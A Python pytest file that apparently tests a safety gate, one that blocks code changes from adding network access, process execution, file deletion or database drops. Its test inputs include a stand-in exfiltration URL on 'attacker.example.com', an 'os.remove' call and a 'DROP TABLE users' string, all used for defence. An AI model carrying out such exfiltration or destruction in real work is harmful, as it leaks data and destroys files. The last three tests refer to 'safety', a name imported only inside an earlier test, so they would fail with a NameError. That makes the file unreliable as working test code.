from __future__ import annotations

import pytest

from core.external_network_safety import (
    assert_no_new_external_capabilities,
    capability_fingerprint,
    new_external_capabilities,
)


def test_existing_network_call_is_allowed_when_not_introduced():
    base = "import urllib.request\n\ndef fetch(url):\n    return urllib.request.urlopen(url)\n"
    produced = base + "\n# harmless local change\n"
    assert new_external_capabilities(base, produced) == ()
    assert_no_new_external_capabilities(base, produced, "agents/example.py")


def test_new_network_import_is_blocked():
    base = "def answer():\n    return 1\n"
    produced = "import requests\n\ndef answer():\n    return requests.get('https://example.com')\n"
    with pytest.raises(RuntimeError, match="external capability"):
        assert_no_new_external_capabilities(base, produced, "agents/example.py")


def test_new_http_destination_is_blocked_even_with_existing_client():
    base = (
        "import urllib.request\n"
        "URL = 'https://api.example.com/status'\n"
        "def fetch():\n"
        "    return urllib.request.urlopen(URL)\n"
    )
    produced = base.replace(
        "https://api.example.com/status",
        "https://attacker.example.com/exfil",
    )
    new = new_external_capabilities(base, produced)
    assert "url:https://attacker.example.com/exfil" in new


def test_new_process_execution_is_blocked():
    base = "def answer():\n    return 1\n"
    produced = "import subprocess\n\nsubprocess.run(['echo', 'unsafe'])\n"
    with pytest.raises(RuntimeError, match="external capability"):
        assert_no_new_external_capabilities(base, produced, "agents/example.py")


def test_fingerprint_is_deterministic():
    source = "import socket\n"
    assert capability_fingerprint(source) == frozenset({"import:socket"})


def test_new_file_deletion_is_blocked_by_revision_gate(tmp_path, monkeypatch):
    # The CLI/revision gate treats any deleted repository file as a destructive change.
    import core.external_network_safety as safety

    commands = [
        ("git", "diff", "--name-status", "base", "produced", "--"),
    ]

    class Result:
        returncode = 0
        stderr = ""
        stdout = "D\timportant.py\n"

    monkeypatch.setattr(safety.subprocess, "run", lambda *args, **kwargs: Result())
    with pytest.raises(RuntimeError, match="deleted files"):
        safety.check_revision("base", "produced")


def test_new_destructive_filesystem_call_is_blocked():
    base = "def clean(path):\n    return path\n"
    produced = "import os\n\ndef clean(path):\n    os.remove(path)\n"
    with pytest.raises(RuntimeError, match="destructive capability"):
        safety.assert_no_new_destructive_capabilities(base, produced, "agents/example.py")


def test_existing_destructive_call_is_not_flagged_as_new():
    base = "import os\n\ndef clean(path):\n    os.remove(path)\n"
    produced = base + "\n# harmless local change\n"
    assert safety.new_destructive_capabilities(base, produced) == ()


def test_new_database_drop_is_blocked():
    base = "def query(sql):\n    return sql\n"
    produced = 'def query(sql):\n    return "DROP TABLE users"\n'
    with pytest.raises(RuntimeError, match="destructive capability"):
        safety.assert_no_new_destructive_capabilities(base, produced, "agents/example.py")
